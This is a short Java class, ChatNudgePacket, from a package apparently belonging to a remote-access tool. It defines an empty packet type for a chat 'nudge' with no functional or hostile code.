package rat.packets;

import java.io.Serializable;

public class ChatNudgePacket implements IPacket, Serializable {

    private static final long serialVersionUID = -6922572358354356617L;

    @Override
    public void execute() {
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.CHAT_NUDGE;
    }
}
